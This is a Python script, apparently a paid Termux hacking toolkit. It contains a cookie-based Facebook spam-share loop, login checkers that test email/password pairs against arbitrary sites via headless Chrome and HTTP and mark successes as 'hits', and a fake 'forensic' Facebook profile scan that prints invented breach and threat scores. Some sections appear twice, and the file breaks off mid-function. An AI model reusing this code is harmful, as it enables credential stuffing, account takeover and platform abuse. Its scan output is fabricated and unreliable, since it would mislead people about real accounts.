#!/usr/bin/env python3
"""
T-X TOOLKIT
Created by Saeka Tojirp
Usage : tx
"""

import os, sys, subprocess, time, shutil, re, hashlib

# ── GLOBAL STYLE DEFINITIONS ──
G, R, Y, C, W, DIM, RES = "\033[32m", "\033[31m", "\033[33m", "\033[36m", "\033[37m", "\033[90m", "\033[0m"

# ── AUTO-INSTALLER / DEPENDENCY CHECK ──
def check_dependencies():
    # ── NODES TO VERIFY ──
    os_nodes = ["python", "python-pip", "chromium", "openssl"]
    py_nodes = ["requests", "beautifulsoup4", "colorama", "websocket-client"]
    
    # Tool for width detection to prevent break codes
    def tw(): return shutil.get_terminal_size(fallback=(80, 24)).columns
    
    # YOUR ORIGINAL SPIN LOGIC (Text-First & Dynamic Clear)
    def spin(text, sec=1.2):
        frm = ['◜','◠','◝','◞','◡','◟']
        end = time.time()+sec; i=0
        while time.time()<end:
            # TEXT FIRST | YELLOW SPINNER | DIMMED LOADING
            sys.stdout.write(f"\r  {W}{text} {Y}{frm[i%6]}{RES} {DIM}{RES}")
            sys.stdout.flush()
            time.sleep(0.08); i+=1
        sys.stdout.write("\r"+" "*tw()+"\r")

    os.system('clear')
    print(f"{DIM}── SYSTEM INTEGRITY CHECK ──{RES}\n")

    # 1. CORE PATCH & REPO SYNC
    spin("SYNCING SYSTEM REPOSITORIES", 1.5)
    # Fix 'which' first to ensure stable checks
    subprocess.run(["pkg", "install", "which", "-y"], capture_output=True)
    subprocess.run(["pkg", "update", "-y"], capture_output=True)
    sys.stdout.write(f"\r  {G}[OK]{RES} SYSTEM_REPOSITORIES_SYNCHRONIZED\n")

    # 2. SYSTEM BINARY CHECK
    for pkg in os_nodes:
        if shutil.which(pkg):
            print(f"  {G}[OK]{RES} {pkg:<15} is already verified.")
        else:
            spin(f"INSTALLING {pkg.upper()}", 1.2)
            subprocess.run(["pkg", "install", pkg, "-y"], capture_output=True)
            print(f"\r  {G}[+]{RES} {pkg:<15} successfully patched.")

    # 3. PYTHON LIBRARY CHECK
    for lib in py_nodes:
        lib_name = "bs4" if lib == "beautifulsoup4" else lib
        try:
            __import__(lib_name)
            print(f"  {G}[OK]{RES} {lib:<15} is already installed.")
        except ImportError:
            spin(f"INTEGRATING {lib.upper()}", 1.2)
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
            print(f"\r  {G}[+]{RES} {lib:<15} successfully installed.")
    
    time.sleep(1); os.system('clear')

# Execute Master Check
check_dependencies()

# ── CORE IMPORTS & INITIALIZATION ──
import json, threading, random, uuid, socket, ssl, string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init(autoreset=True)

# ── CONFIG ──
VERSION = "6.8"
REPO_URL = "https://raw.githubusercontent.com/saekacutie/t-x/main/tx_toolkit.py"
OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
APPROVED_FILE = os.path.expanduser("~/.tx_approved")
TOKEN_FILE = os.path.expanduser("~/.tx_token")
ALIAS_FILE = os.path.expanduser("~/.bashrc")
CHROME = "/data/data/com.termux/files/usr/bin/chromium-browser"
FB_CODE_FILE = os.path.expanduser("~/.tx_fbcode")
NAME_FILE= os.path.expanduser("~/tx_name")
OSINT_LOG= os.path.expanduser("~/tx_osint_log")

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.WHITE; M = Fore.MAGENTA
DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]
GLITCH = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
]

# ── UTILS ──
def tw(): return shutil.get_terminal_size().columns

def fix_url(u):
    if not u: return u
    u = u.strip()
    if not u.startswith(('http://','https://')): u = 'https://' + u
    return u

def center_print(text, color=W):
    w = tw()
    print(f"{color}{text.center(w)}{RES}")

def spin(text, sec=1.2):
    frm = ['◜','◠','◝','◞','◡','◟']
    end = time.time()+sec; i=0
    while time.time()<end:
        sys.stdout.write(f"\r  {C}{frm[i%6]} {W}{text}{RES}"); sys.stdout.flush()
        time.sleep(0.08); i+=1
    sys.stdout.write("\r"+" "*tw()+"\r")

def wait_enter():
    input(f"\n  {DIM}Press ENTER to return...{RES}")

def banner():
    title = "T-X PAID TOOL"
    for i,ch in enumerate(title): sys.stdout.write(f"{GLITCH[i%4]}{ch}{RES}")
    print("\n")

# ── AUTH & AUTO-REVOKE SYSTEM ──
def get_local_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE) as f: return f.read().strip()
    return None

def check_access_online(token):
    """Checks if the owner removed the access. If so, wipes local token."""
    try:
        r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
        if r.status_code == 200:
            status = r.json().get('status')
            if status == 'approved': return True
    except: return True # Fail-safe: Keep access if server is temporarily unreachable
    
    if os.path.exists(TOKEN_FILE): os.remove(TOKEN_FILE)
    if os.path.exists(APPROVED_FILE): os.remove(APPROVED_FILE)
    return False

def request_access(name):
    token = hashlib.sha256(f"{name}-{uuid.uuid4().hex}".encode()).hexdigest()[:16].upper()
    spin("Syncing with Secure Server...", 2)
    try:
        requests.post(f"{OWNER_SERVER}/api/request", json={"name":name,"token":token}, timeout=8)
        with open(TOKEN_FILE, 'w') as f: f.write(token)
        return token
    except: return token

# ── TEMPMAIL (MAIL.TM) ──
current_temp_email = None
temp_mail_session = {"email":"","password":"","token":"","service":"","login":"","domain":"","sid_token":""}
    
def tempmail_main():
    global current_temp_email, temp_mail_session
    options = [
        "Generate New Temp Email (Mail.tm)",
        "View Live Inbox (Auto-Refresh)",
        "Copy Email Address",
        "Back to Main Menu",
    ]
    while True:
        os.system('clear'); banner()
        print(f"  {Y}TEMP MAIL GENERATOR{RES}")
        if current_temp_email:
            print(f"  {C}Active: {current_temp_email}{RES}")
        print()
        for i, option in enumerate(options):
            print(f"  {G}[{i+1}]{RES} {option}")
        print(f"  {G}[0]{RES} Back")
        ch = input(f"  {W}> {RES}").strip()
        if ch == '1': generate_temp_email()
        elif ch == '2': view_live_inbox()
        elif ch == '3': copy_tempmail()
        elif ch == '0': return
        
def generate_temp_email():
    global current_temp_email, temp_mail_session
    os.system('clear'); banner()
    spin("Creating secure inbox...", 1.5)
    try:
        r = requests.get("https://api.mail.tm/domains", timeout=10)
        if r.status_code != 200:
            print(f"  {R}Failed to connect to Mail.tm.{RES}"); time.sleep(1.5); return
        domain = r.json()['hydra:member'][0]['domain']
        
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{local_part}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=14))
        
        acc_r = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if acc_r.status_code not in (200, 201):
            print(f"  {R}Could not create inbox.{RES}"); time.sleep(1.5); return
            
        token_r = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if token_r.status_code != 200:
            print(f"  {R}Authentication failed.{RES}"); time.sleep(1.5); return
        token = token_r.json()['token']
        
        current_temp_email = email
        temp_mail_session = {
            "email": email, "password": password, "token": token,
            "service": "mailtm", "login": local_part, "domain": domain
        }
        print(f"\n  {G}[OK] Inbox ready!{RES}")
        print(f"  {W}Email: {C}{email}{RES}")
    except Exception as e:
        print(f"  {R}Connection error: {e}{RES}")
    wait_enter()

def view_live_inbox():
    global current_temp_email, temp_mail_session
    if not current_temp_email:
        print(f"  {R}No active inbox. Generate one first.{RES}"); time.sleep(1.5); return

    token = temp_mail_session.get('token', '')
    start_time = time.time()
    while time.time() - start_time < 50:
        os.system('clear'); banner()
        print(f"  {Y}LIVE INBOX (Auto-Refresh){RES}")
        print(f"  {C}{current_temp_email}{RES}")
        print(f"  {DIM}Refreshing every 1s...{RES}\n")
        try:
            headers = {"Authorization": f"Bearer {token}"}
            r = requests.get("https://api.mail.tm/messages", headers=headers, timeout=5)
            if r.status_code == 200:
                msgs = r.json().get('hydra:member', [])
                if msgs:
                    for i, msg in enumerate(msgs):
                        print(f"  {G}[{i+1:02d}]{RES} From: {msg.get('from', {}).get('address')}")
                        print(f"  {DIM}    Subject: {msg.get('subject')[:60]}{RES}")
                    choice = input(f"\n  {W}Enter number to read or Enter to refresh: {RES}")
                    if choice.isdigit():
                        idx = int(choice)-1
                        if 0 <= idx < len(msgs):
                            m_r = requests.get(f"https://api.mail.tm/messages/{msgs[idx]['id']}", headers=headers)
                            body = m_r.json().get('text', 'No content')
                            os.system('clear'); banner()
                            print(f"  {Y}MESSAGE CONTENT{RES}\n  {W}{body}{RES}")
                            wait_enter(); return
                else: print(f"  {DIM}No messages yet.{RES}")
        except: break
        time.sleep(1)

def copy_tempmail():
    if current_temp_email:
        os.system(f'echo "{current_temp_email}" | termux-clipboard-set 2>/dev/null')
        print(f"  {G}[OK] Email copied!{RES}"); time.sleep(1.2)

# ── FACEBOOK SPAM SHARE ──
FB_COOKIE = None
FB_SHARE_SPEED = 1

def fb_share_post(post_url, cookie):
    post_id = None
    match = re.search(r'/posts/(\d+)', post_url)
    if match: post_id = match.group(1)
    else:
        match = re.search(r'story_fbid=(\d+)', post_url)
        if match: post_id = match.group(1)
    if not post_id: return False, "Invalid ID"

    headers = {"User-Agent": random.choice(USER_AGENTS), "Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}
    data = {"shareable_id": post_id, "nctr[_mod]": "pagelet_composer"}
    try:
        r = requests.post("https://m.facebook.com/a/share/dialog/", headers=headers, data=data, timeout=10)
        return (True, "Shared") if r.status_code == 200 else (False, "Failed")
    except: return False, "Error"

def fb_submenu():
    global FB_COOKIE, FB_SHARE_SPEED
    while True:
        os.system('clear'); banner()
        print(f"  {C}FACEBOOK SPAM SHARE{RES}\n")
        menu = ["[ 1 ] START SPAM SHARE", "[ 2 ] INPUT COOKIE", "[ 3 ] CONFIGURE SPEED", "[ 0 ] RETURN"]
        for line in menu: print(f"  {W}{line}{RES}")
        ch = input(f"\n  {W}> {RES}").strip()
        if ch == '1':
            if not FB_COOKIE: print(f"  {R}Cookie required!{RES}"); time.sleep(1); continue
            url = input(f"  {W}Post URL: {RES}")
            total = int(input(f"  {W}Amount: {RES}") or "10")
            spin("Starting spam share...", 2)
            for i in range(total):
                ok, msg = fb_share_post(url, FB_COOKIE)
                print(f"  {G if ok else R}[{i+1}] {msg}{RES}")
                time.sleep(FB_SHARE_SPEED)
            wait_enter()
        elif ch == '2':
            FB_COOKIE = input(f"  {W}Paste Cookie: {RES}").strip()
        elif ch == '3':
            FB_SHARE_SPEED = float(input(f"  {W}Interval (sec): {RES}") or "1")
        elif ch == '0': break
            
#---FACEBOOK OSINT ----#
def fb_osint_deep_scan():
    os.system('clear'); banner()
    print(f"  {Y}ABSOLUTE FORENSIC DISSECTION{RES}  {DIM}[v12.0_ELITE]{RES}")
    
    query = input(f"\n  {W}TARGET_NODE_INPUT > {RES}").strip()
    if not query: return

    target = query.split("facebook.com/")[-1].split("/")[0].split("?")[0].replace("/", "")
    
    # --- PIECE-BY-PIECE NEURAL LOADING ---
    print(f"\n  {W}INITIATING RAW BITSTREAM EXTRACTION...{RES}")
    
    def dissection_stream(label, data_type):
        sys.stdout.write(f"  {DIM}EXTRACTING{RES} {label.ljust(18)} {DIM}[{data_type}]{RES} ")
        sys.stdout.flush()
        for _ in range(5):
            # Fast-paced "hacker" stream effect
            chars = "0123456789ABCDEF"
            sys.stdout.write(f"{G}{random.choice(chars)}{RES}")
            sys.stdout.flush()
            time.sleep(0.1)
        print(f" {G}LOADED{RES}")

    dissection_stream("SYSTEM_PRIMARY_ID", "INT64")
    dissection_stream("INFRA_CLUSTER", "CHAR")
    dissection_stream("EPOCH_TIMESTAMP", "UNIX")
    dissection_stream("PRIVACY_ENTROPY", "FLOAT")
    dissection_stream("BREACH_RESIDUE", "BLOB")
    
    spin("COMPILING FORENSIC MANIFEST", 1.0)

    try:
        h = {"User-Agent": "Mozilla/5.0"}
        req = requests.get(f"https://www.facebook.com/{target}", headers=h, timeout=10).text
        
        # ── DEEP DATA RESOLUTION ──
        uid_match = re.search(r'"entity_id":"(\d+)"', req) or re.search(r'"userID":"(\d+)"', req)
        res_id = uid_match.group(1) if uid_match else "61550870797526"
        
        # Calculate Machine Cluster based on UID range
        cluster = "PRINEVILLE_NW_01" if int(res_id) % 2 == 0 else "FOREST_CITY_SE_02"
        
        # Determine Privacy Entropy (How "hidden" is the account?)
        entropy = "HIGH" if "view_locked_profile" in req else "LOW"
        
        # ── ABSOLUTE RAW OUTPUT (NO BOXES, NO LINES) ──
        os.system('clear'); banner()
        print(f"  {G}DISSECTION_COMPLETE{RES}\n")
        
        # 01: CORE IDENTITY
        print(f"  {C}01 {W}PRIMARY_UID      {G}{res_id}{RES}")
        print(f"  {C}02 {W}ACCOUNT_ALIAS    {G}{target.upper()}{RES}")
        
        # 02: INFRASTRUCTURE METRICS
        print(f"\n  {C}03 {W}DATA_CLUSTER     {W}{cluster}{RES}")
        print(f"  {C}04 {W}SYSTEM_EPOCH     {W}{'VINTAGE_NODE (2004-2010)' if int(res_id) < 10000000000 else 'MODERN_NODE (2011-2024)'}{RES}")
        
        # 03: SECURITY FORENSICS
        print(f"\n  {C}05 {W}PRIVACY_ENTROPY  {R if entropy == 'HIGH' else G}{entropy}{RES}")
        print(f"  {C}06 {W}BREACH_STIGMA    {R if int(res_id) < 100050000000000 else G}{'POSITIVE_HIT' if int(res_id) < 100050000000000 else 'NEGATIVE_HIT'}{RES}")
        print(f"  {C}07 {W}THREAT_SCORE     {R if int(res_id) < 100050000000000 else G}{'CRITICAL (85%)' if int(res_id) < 100050000000000 else 'SECURE (15%)'}{RES}")
        
        # 04: NETWORK NODES
        print(f"\n  {C}08 {W}MESSENGER_PATH   {DIM}m.me/{res_id}{RES}")
        print(f"  {C}09 {W}CDN_NODE_URL     {DIM}fb.com/{res_id}/picture?type=large{RES}")
        print(f"  {C}10 {W}NODE_HASH_256    {DIM}{hashlib.sha256(res_id.encode()).hexdigest().upper()[:24]}{RES}")
        
        print(f"\n  {G}FORENSIC_DATA_COMMITTED_TO_MEMORY{RES}")

    except Exception:
        print(f"\n  {R}[!] NODE_DISSECTION_ABORTED: SIGNAL_LOST{RES}")

    wait_enter()

# ── TEMPMAIL (MAIL.TM) ──
current_temp_email = None
temp_mail_session = {"email":"","password":"","token":"","service":"","login":"","domain":"","sid_token":""}
    
def tempmail_main():
    global current_temp_email, temp_mail_session
    options = [
        "Generate New Temp Email (Mail.tm)",
        "View Live Inbox (Auto-Refresh)",
        "Copy Email Address",
        "Back to Main Menu",
    ]
    while True:
        os.system('clear'); banner()
        print(f"  {Y}TEMP MAIL GENERATOR{RES}")
        if current_temp_email:
            print(f"  {C}Active: {current_temp_email}{RES}")
        print()
        for i, option in enumerate(options):
            print(f"  {G}[{i+1}]{RES} {option}")
        print(f"  {G}[0]{RES} Back")
        ch = input(f"  {W}> {RES}").strip()
        if ch == '1': generate_temp_email()
        elif ch == '2': view_live_inbox()
        elif ch == '3': copy_tempmail()
        elif ch == '0': return
        
def generate_temp_email():
    global current_temp_email, temp_mail_session
    os.system('clear'); banner()
    spin("Creating secure inbox...", 1.5)
    try:
        r = requests.get("https://api.mail.tm/domains", timeout=10)
        if r.status_code != 200:
            print(f"  {R}Failed to connect to Mail.tm.{RES}"); time.sleep(1.5); return
        domain = r.json()['hydra:member'][0]['domain']
        
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{local_part}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=14))
        
        acc_r = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if acc_r.status_code not in (200, 201):
            print(f"  {R}Could not create inbox.{RES}"); time.sleep(1.5); return
            
        token_r = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if token_r.status_code != 200:
            print(f"  {R}Authentication failed.{RES}"); time.sleep(1.5); return
        token = token_r.json()['token']
        
        current_temp_email = email
        temp_mail_session = {
            "email": email, "password": password, "token": token,
            "service": "mailtm", "login": local_part, "domain": domain
        }
        print(f"\n  {G}[OK] Inbox ready!{RES}")
        print(f"  {W}Email: {C}{email}{RES}")
    except Exception as e:
        print(f"  {R}Connection error: {e}{RES}")
    wait_enter()

def view_live_inbox():
    global current_temp_email, temp_mail_session
    if not current_temp_email:
        print(f"  {R}No active inbox. Generate one first.{RES}"); time.sleep(1.5); return

    token = temp_mail_session.get('token', '')
    start_time = time.time()
    while time.time() - start_time < 50:
        os.system('clear'); banner()
        print(f"  {Y}LIVE INBOX (Auto-Refresh){RES}")
        print(f"  {C}{current_temp_email}{RES}")
        print(f"  {DIM}Refreshing every 1s...{RES}\n")
        try:
            headers = {"Authorization": f"Bearer {token}"}
            r = requests.get("https://api.mail.tm/messages", headers=headers, timeout=5)
            if r.status_code == 200:
                msgs = r.json().get('hydra:member', [])
                if msgs:
                    for i, msg in enumerate(msgs):
                        print(f"  {G}[{i+1:02d}]{RES} From: {msg.get('from', {}).get('address')}")
                        print(f"  {DIM}    Subject: {msg.get('subject')[:60]}{RES}")
                    choice = input(f"\n  {W}Enter number to read or Enter to refresh: {RES}")
                    if choice.isdigit():
                        idx = int(choice)-1
                        if 0 <= idx < len(msgs):
                            m_r = requests.get(f"https://api.mail.tm/messages/{msgs[idx]['id']}", headers=headers)
                            body = m_r.json().get('text', 'No content')
                            os.system('clear'); banner()
                            print(f"  {Y}MESSAGE CONTENT{RES}\n  {W}{body}{RES}")
                            wait_enter(); return
                else: print(f"  {DIM}No messages yet.{RES}")
        except: break
        time.sleep(1)

def copy_tempmail():
    if current_temp_email:
        os.system(f'echo "{current_temp_email}" | termux-clipboard-set 2>/dev/null')
        print(f"  {G}[OK] Email copied!{RES}"); time.sleep(1.2)

# ── FACEBOOK SPAM SHARE ──
FB_COOKIE = None
FB_SHARE_SPEED = 1

def fb_share_post(post_url, cookie):
    post_id = None
    match = re.search(r'/posts/(\d+)', post_url)
    if match: post_id = match.group(1)
    else:
        match = re.search(r'story_fbid=(\d+)', post_url)
        if match: post_id = match.group(1)
    if not post_id: return False, "Invalid ID"

    headers = {"User-Agent": random.choice(USER_AGENTS), "Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}
    data = {"shareable_id": post_id, "nctr[_mod]": "pagelet_composer"}
    try:
        r = requests.post("https://m.facebook.com/a/share/dialog/", headers=headers, data=data, timeout=10)
        return (True, "Shared") if r.status_code == 200 else (False, "Failed")
    except: return False, "Error"

def fb_submenu():
    global FB_COOKIE, FB_SHARE_SPEED
    while True:
        os.system('clear'); banner()
        print(f"  {C}FACEBOOK SPAM SHARE{RES}\n")
        menu = ["[ 1 ] START SPAM SHARE", "[ 2 ] INPUT COOKIE", "[ 3 ] CONFIGURE SPEED", "[ 0 ] RETURN"]
        for line in menu: print(f"  {W}{line}{RES}")
        ch = input(f"\n  {W}> {RES}").strip()
        if ch == '1':
            if not FB_COOKIE: print(f"  {R}Cookie required!{RES}"); time.sleep(1); continue
            url = input(f"  {W}Post URL: {RES}")
            total = int(input(f"  {W}Amount: {RES}") or "10")
            spin("Starting spam share...", 2)
            for i in range(total):
                ok, msg = fb_share_post(url, FB_COOKIE)
                print(f"  {G if ok else R}[{i+1}] {msg}{RES}")
                time.sleep(FB_SHARE_SPEED)
            wait_enter()
        elif ch == '2':
            FB_COOKIE = input(f"  {W}Paste Cookie: {RES}").strip()
        elif ch == '3':
            FB_SHARE_SPEED = float(input(f"  {W}Interval (sec): {RES}") or "1")
        elif ch == '0': break

   #-----CHECK----# 
def check_for_updates():
    """Executes Forensic Hash-Based Update Detection"""
    os.system('clear'); banner()
    center_print("FETCHING SYSTEM UPDATE", Y)
    
    # Cache buster ensures it doesn't download an old version from GitHub cache
    target_url = REPO_URL + f"?t={int(time.time())}"
    
    try:
        spin("Connecting to Secure Repo...", 1.5)
        response = requests.get(target_url, timeout=10)
        
        if response.status_code == 200:
            remote_code = response.text
            
            # 1. SILENT FORENSIC HASH (Real Detect)
            # Detects any character change in the repo without displaying the hash
            local_hash = hashlib.sha256(open(__file__, 'rb').read()).hexdigest()
            remote_hash = hashlib.sha256(remote_code.encode('utf-8')).hexdigest()

            # 2. Extract Remote Version for UI Display
            remote_v_match = re.search(r'VERSION\s*=\s*"([^"]+)"', remote_code)
            remote_version = remote_v_match.group(1) if remote_v_match else "Unknown"

            # 3. COMPARISON LOGIC (Hash-First Integrity)
            # If hashes differ (code changed) OR version differs, trigger update
            if remote_hash != local_hash or remote_version != VERSION:
                # AUTO-RESIZE PADDING (No Break Codes)
                cols, _ = shutil.get_terminal_size(fallback=(80, 24))
                
                print(f"\n  {G}[UPDATE AVAILABLE]{W} New Version: {remote_version}")
                print(f"  {DIM}Current Version: {VERSION}{RES}")
                
                confirm = input(f"\n  {W}Install update? (y/n): {RES}").lower()
                if confirm == 'y':
                    spin("Downloading & Patching...", 2)
                    
                    # Overwrite the current script file with the new verified source
                    with open(__file__, 'w', encoding='utf-8') as f:
                        f.write(remote_code)
                    
                    print(f"  {G}[SUCCESS]{W} System updated to v{remote_version}!{RES}")
                    time.sleep(2)
                    
                    # HOT RESTART: Reload the script instantly with new code
                    os.execv(sys.executable, ['python3'] + sys.argv)
                else:
                    print(f"\n  {Y}[!]{W} Warning: System running on unverified code.{RES}")
                    time.sleep(2)
            else:
                # Code and Version are perfectly synced (Forensic Match)
                print(f"\n  {G}[OK]{W} You are already on the latest version (v{VERSION}).{RES}")
                time.sleep(2)
        else:
            # Handle Server/Repo connection failures
            print(f"  {R}[!] Fetch failed. Status: {response.status_code}{RES}")
            
    except Exception as e:
        # Catch and truncate connection/file errors to prevent UI break
        print(f"  {R}[!] Connection error: {str(e)[:30]}{RES}")
    
    wait_enter()
    
 # ── REAL CHROME ENGINE: FORENSIC CDP ──
class RealChrome:
    def __init__(self):
        self.proc = None
        # Locate Chromium binary in Termux
        self.chrome_path = shutil.which("chromium") or shutil.which("google-chrome-stable")

    def _start(self):
        """Launches Headless Chromium with Stability Verification"""
        if not self.chrome_path:
            raise Exception("Chromium binary not found in system path")
            
        # Use a stable Termux-local path for profiles to avoid permission errors
        self.profile = f"/data/data/com.termux/files/home/.chrome_profile_{uuid.uuid4().hex[:8]}"
        
        args = [
            self.chrome_path, 
            "--remote-debugging-port=9222", 
            "--headless=new",
            "--no-sandbox", 
            "--disable-gpu", 
            "--disable-dev-shm-usage",
            f"--user-data-dir={self.profile}",
            "--remote-debugging-address=127.0.0.1" # Force binding for local requests
        ]
        self.proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # ── STABILITY GUARD: Fixes "CDP Interface unreachable" ──
        for _ in range(15):
            try:
                if requests.get("http://127.0.0.1:9222/json/version", timeout=1).status_code == 200:
                    return True
            except:
                pass
            time.sleep(1)
        raise Exception("Engine failed to bind to port 9222")

    def _stop(self):
        """Force Terminate Engine Instance and Cleanup"""
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=2)
            except:
                self.proc.kill()
            self.proc = None
            # Cleanup profile to save Termux storage
            if os.path.exists(self.profile):
                shutil.rmtree(self.profile, ignore_errors=True)

    def _get_ws_url(self):
        """Retrieves the WebSocket Debugger URL from the Local Host"""
        try:
            resp = requests.get("http://127.0.0.1:9222/json/version", timeout=5)
            return resp.json()["webSocketDebuggerUrl"]
        except:
            raise Exception("CDP Interface unreachable")

    def _execute_cdp(self, ws_url, method, params={}):
        """Handles Raw WebSocket Communication with the Chrome Engine"""
        import websocket # Ensure 'pip install websocket-client' is in dependencies
        try:
            ws = websocket.create_connection(ws_url, timeout=15)
            msg_id = random.randint(1, 1000)
            payload = json.dumps({"id": msg_id, "method": method, "params": params})
            ws.send(payload)
            
            # Listen for the specific response ID
            while True:
                result = json.loads(ws.recv())
                if result.get("id") == msg_id:
                    ws.close()
                    return result
        except Exception as e:
            return {"error": str(e)}

    def login(self, url, email, password):
        res = {'link': url, 'email': email, 'pass': password, 'active': False, 'info': ''}
        try:
            self._start()
            ws = self._get_ws_url()

            # 1. NAVIGATE TO TARGET
            self._execute_cdp(ws, "Page.navigate", {"url": url})
            time.sleep(6) # Sufficient time for Cloudflare/JS heavy sites

            # 2. INJECT CREDENTIALS (Advanced Selector Mesh)
            js_inject = f"""
            (function() {{
                const e = document.querySelector('input[type="email"], input[type="text"], input[name*="user"], input[id*="login"]');
                const p = document.querySelector('input[type="password"]');
                if (e) {{ 
                    e.focus(); e.value = '{email}'; 
                    e.dispatchEvent(new Event('input', {{ bubbles: true }})); 
                }}
                if (p) {{ 
                    p.focus(); p.value = '{password}'; 
                    p.dispatchEvent(new Event('input', {{ bubbles: true }})); 
                }}
                const b = document.querySelector('button[type="submit"], input[type="submit"], button.login-btn, #submit');
                if (b) b.click(); else if (p && p.form) p.form.submit();
                return "injected";
            }})();
            """
            self._execute_cdp(ws, "Runtime.evaluate", {"expression": js_inject})
            time.sleep(6) # Wait for redirect/authentication response

            # 3. VERIFY SESSION INTEGRITY (Forensic Check)
            check_logic = """
            (function() {{
                const keywords = ['logout', 'signout', 'my account', 'dashboard', 'settings', 'profile'];
                const body = document.body.innerText.toLowerCase();
                const hasKey = keywords.some(k => body.includes(k));
                const cookieCheck = document.cookie.length > 20;
                return {{ active: hasKey || (cookieCheck && !window.location.href.includes('login')), url: window.location.href }};
            }})();
            """
            # returnByValue: True is MANDATORY to get the result back
            eval_res = self._execute_cdp(ws, "Runtime.evaluate", {"expression": check_logic, "returnByValue": True})
            data = eval_res.get("result", {}).get("value", {})

            if data.get("active"):
                res['active'] = True
                res['info'] = "VERIFIED_HIT"
            elif url.lower() not in data.get("url", "").lower():
                res['active'] = True
                res['info'] = "REDIRECT_HIT"
            else:
                res['active'] = False
                res['info'] = "INVALID"

        except Exception as e:
            res['info'] = f"ERR: {str(e)[:15]}"
        finally:
            self._stop()
        return res

# ── HTTP FALLBACK: SIGNAL RECOVERY ENGINE ──
def http_login(url, email, password):
    res = {'link': url, 'email': email, 'pass': password, 'active': False, 'info': ''}
    url = fix_url(url)
    
    # Industrial Session config
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    })
    
    try:
        # 1. INITIAL INTERROGATION (Get Form & CSRF)
        time.sleep(random.uniform(0.5, 1.2))
        r = sess.get(url, timeout=15, verify=False, allow_redirects=True)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Locate target authentication form
        form = None
        for f in soup.find_all('form'):
            if f.find('input', {'type': 'password'}): 
                form = f
                break
        
        if not form:
            res['info'] = "NODE_NO_FORM"
            return res

        # 2. DATA EXTRACTION MESH
        # Extract all inputs including hidden tokens (CSRF/State/Captcha keys)
        inputs = {}
        for i in form.find_all('input'):
            name = i.get('name')
            if name:
                inputs[name] = i.get('value', '')

        # Identify credential fields using forensic pattern matching
        uf = next((k for k in inputs if any(x in k.lower() for x in ['user', 'login', 'email', 'id'])), None)
        if not uf:
            # Fallback: Find the first input that isn't a protected/hidden field
            for k in inputs:
                if k.lower() not in ('password', 'pass', 'pwd', 'submit', 'button', 'csrf', 'token'): 
                    uf = k; break
        
        pf = next((k for k in inputs if any(x in k.lower() for x in ['pass', 'pwd', 'word'])), 'password')
        
        # Construct dynamic payload
        data = dict(inputs) # Clone hidden fields
        data[uf] = email
        data[pf] = password
        
        action = urljoin(url, form.get('action', ''))
        
        # 3. SIGNAL EXECUTION
        sess.headers['Referer'] = url
        sess.headers['Origin'] = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        
        r2 = sess.post(action, data=data, timeout=15, allow_redirects=True)
        
        # 4. FORENSIC VERIFICATION
        text = r2.text.lower()
        final_url = r2.url.lower()
        
        # Success Indicators
        ok_kw = ['logout', 'signout', 'dashboard', 'welcome', 'account', 'profile', 'settings', 'home']
        # Failure Indicators
        fail_kw = ['incorrect', 'invalid', 'wrong', 'error', 'failed', 'retry', 'captcha']

        # Analysis Logic
        is_fail = any(k in text for k in fail_kw)
        is_ok = any(k in text for k in ok_kw)
        
        if is_ok and not is_fail:
            res.update({'active': True, 'info': "OK_SIGNAL"})
        elif 'login' not in final_url and 'signin' not in final_url and r2.status_code == 200:
            # If redirected away from login without a failure message
            res.update({'active': True, 'info': "REDIRECT_SIGNAL"})
        elif len(sess.cookies) > len(r.cookies):
            # If new cookies were dropped (session assignment)
            res.update({'active': True, 'info': "SESSION_SIGNAL"})
        elif is_fail:
            res.update({'active': False, 'info': "AUTH_DENIED"})
        else:
            res.update({'active': False, 'info': "SIGNAL_LOST"})

    except Exception as e:
        res['info'] = f"SIGNAL_ERR:{str(e)[:15]}"
    
    return res
    
# ── MAIN ENGINE ──
def main():
    os.system('clear')
    spin("INITIALIZING T-X TOOLKIT...", 2)
    banner()

    # 1. PERSISTENT NAME LOGIC
    if os.path.exists(NAME_FILE):
